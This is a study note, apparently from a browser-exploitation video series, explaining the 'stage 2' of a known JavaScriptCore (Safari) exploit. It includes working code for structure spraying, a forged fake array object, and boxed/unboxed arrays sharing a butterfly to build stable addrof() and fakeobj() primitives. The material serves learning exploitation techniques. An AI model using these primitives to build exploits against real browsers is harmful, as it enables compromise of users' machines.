Ep 8 (Preparing for Stage 2)
------------------------------
http://www.phrack.org/papers/attacking_javascript_engines.html
https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html
(https://www.youtube.com/watch?v=3c6nC0wdU-Q&list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t&index=8)
Watching the video is probably better for this one, liveoverflow made some cool animations 
If you understand previous notes, this episode is not a problem

In this episode,we take a look at Niklas's implementation of stage 2.

What is stage 2? 
Well after we have our stage 1 addrof() and fakeobj(), we can use it to craft a stage 2 addrof() and fakeobj()
which is much more reliable, stable and easier to use

Niklas's Poc Exploit
------------------------
Niklas also made a lot of objects to guarentee the structure id of our fake object, but Niklas did some additional stuff

Setup
-------
var structure_spray = [];
for(var i=0; i<1000; i++) {
    var array = [13.37];
    array.a = 13.37;
    array['p'+i] = 13.37;
    structure_spray.push(array)
}
var victim = structure_spray[510];

Instead of just making objects, Niklas made array of doubles and added 2 properties to it. He also stored all of the arrays in structure_spray.
He randomly picked an array in structure_spray to be the 'victim'.

Visualize: https://liveoverflow.com/content/images/2019/07/spray_and_victim.png

u32[0] = 0x200; <- Structure id
u32[1] = 0x01082007 - 0x10000;
var flags_double = f64[0];

u32[1] = 0x01082009 - 0x10000;
var flags_contiguous = f64[0];

Niklas then started to forge a JSCellHeader
Niklas then prepared the flags for an ArrayOfDoubles and the flags for an ArrayWithContiguous
He set both of the structure ids to 0x200 (Most probably a structure id of ArrayOfDoubles sprayed earlier)

Create fake object
------------------
var outer = {
    header: flags_contiguous, // cell
    butterfly: victim, // butterfly
};
//print(`outer @ ${hex(stage1.addrof(outer))}`);

var hax = stage1.fakeobj(stage1.addrof(outer) + 0x10);

He then created a object with two properties, cellheader and butterfly which is used to create a fake object
Notice that the butterfly is pointing at the victim

He used the outer object's properties to create a fake objecti (ArrayWithContiguous) named 'hax' which has a butterfly pointing at ptr

Now, the victim object's metadata (JSCellHeader etc) are also the elements of the fake object

which means 
hax[0] is victim jscellheader
hax[1] is victim butterfly

Visualization: https://liveoverflow.com/content/images/2019/07/ov1.gif

Box Unbox
---------
var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`); <- same as unboxed = [13.37,13.37,13.37,...]
unboxed[0] = 4.2; // no CopyOnWriteArrayWithDouble,only ArrayWithDouble

var boxed = [{}];

Niklas made two arrays, one unboxed(ArrayOfDoubles) and one boxed(ArrayOfContiguous/JsValues)
Visualization: https://liveoverflow.com/content/images/2019/07/ov2.png

hax[1] = unboxed;
var unboxedButterfly = victim[1];

Niklas then changed the butterfly of victim to point to the metadata of unboxed
so now
victim[0] is unboxed JSCellHeader;
victim[1] is unboxed butterfly;

Niklas stored the unboxed butterfly in a variable

hax[1] = boxed;
victim[1] = unboxedButterfly;

Niklas then overwrote the butterfly of victim again to point to the metadata of boxed 
He also overwrote the butterfly of BOXED to the butterfly of UNBOXED 
So now both the butterflys of boxed and unboxed are the SAME

Visualization: https://liveoverflow.com/content/images/2019/07/ov3.gif

The new addrof() and fakeobj()
--------------------------------
Remember that unboxed is an ArrayOfDoubles and doesnt use NaN-encoding,it just stores raw doubles
Boxed is an ArrayOfContiguous and uses NaN-encoding and deals with JSValues!

Now to create a fake object, we can just use the unboxed array to write a double without NaN-encoding
But if we access it using the boxed array,NaN-encoding would think the following double was a ptr

Example:
Lets say theres an object at 0x000062d0007de880
unboxed[0] = 5.367800960505e-310 (in memory is 0x000062d0007de880)
boxed[0] would return an Object because of NaN-encoding!

Now to leak an address of an object,you would use boxed to store an object, and use unboxed to read the ptr
Since unboxed is an ArrayOfDouble, it would return a double 

Example:
boxed[0] = {}
unboxed[0] would return 5.367800960505e-310 (some random memory address in the form of a double)

This is practically the same idea/concept of the stage 1 addrof() and fake obj

Now you can create a stage 2 addrof() and fakeobj()

function stage2_addrof(obj){
    boxed[0] = obj;
    return unboxed[0];
}

function stage2_fakeobj(dbl){
    unboxed[0] = dbl;
    return boxed[0];
}

Beautiful
